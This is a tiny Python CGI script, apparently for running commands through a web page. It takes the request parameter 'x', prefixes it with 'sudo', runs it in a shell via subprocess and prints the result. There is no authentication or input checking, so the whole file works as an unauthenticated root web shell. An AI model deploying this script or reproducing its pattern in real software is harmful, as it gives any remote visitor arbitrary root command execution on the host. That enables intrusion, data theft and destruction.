#!/usr/bin/python3

print("content-type: text/html \n")

import cgi
import subprocess

form = cgi.FieldStorage()
cmd = form.getvalue("x")

output = subprocess.getoutput("sudo " + cmd)
print (output)
